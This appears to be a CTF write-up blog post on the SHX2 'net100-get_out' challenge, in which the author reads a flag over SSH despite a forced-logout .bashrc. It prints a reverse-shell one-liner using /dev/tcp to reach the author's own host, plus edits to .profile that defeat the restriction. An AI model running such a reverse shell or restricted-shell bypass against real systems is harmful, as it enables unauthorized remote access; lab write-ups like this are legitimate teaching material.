---
title: "SHX2 : net100-get_out"
date: "2017-01-30T15:30:38.000Z"
lastmod: "2017-06-05T15:28:21.000Z"
tags: ["ctf", "networking", "shx2"]
slug: "shx2-net100-get_out"
url: "/shx2-net100-get_out/"
---
The hardest was to get credentials, but now we can not make use of them.   
user: kevin   
password: k3vin@pass   
To start your challenge environment, please click on the right button (it starts a new docker session and displays ip:port)

## Solution

Some fingerprints..

- `nmap -p32772 lab.shellterlabs.com` returns `32772/tcp open sometimes-rpc7`
- `nc lab.shellterlabs.com 32772` returns `SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1`

SSH for sure..

```bash
intrd@inix:~$ ssh kevin@lab.shellterlabs.com -p 32772  
[lab.shellterlabs.com]:32772,[34.198.94.240]:32772 (ECDSA) to the list of known hosts.
kevin@lab.shellterlabs.com's password:  
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-59-generic x86_64)  
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri Jan 27 00:31:44 2017 from 172.17.0.1  
Connection to lab.shellterlabs.com closed.
```

It drops the session after connect.. clearly some scripts are running after/inside `.bashrc`.

If this is true, we can still send any command because i know the SSH process commands before `.bashrc` are loaded.

![](/content/images/2017/03/Selection_999-022-.png)

After some commands, `ssh kevin@lab.shellterlabs.com -p 32772 "cat .th3_fl4g.file"` returns the flag.

Flag: **shellter{CENSORED}**

Easy, no?

### Remote shell and fixing the connection drop 4 fun

Spawned a remote shell w/ `ssh kevin@lab.shellterlabs.com -p 32772 "/bin/sh </dev/tcp/myip/port >&0 2>&0"` and fixed the connection drop, by removing last line `exit` from `.profile` which is loaded by `.bashrc`.

![](/content/images/2017/01/Selection_427.jpg)

`head -n -1 .profile > profile.txt ; mv profile.txt .profile` to remove the last line of `.profile`.

![](/content/images/2017/03/Selection_999-024-.png)

All done.   
Docker environment closed.

## SHX2 final score..

![](/content/images/2017/02/Selection_423.jpg)
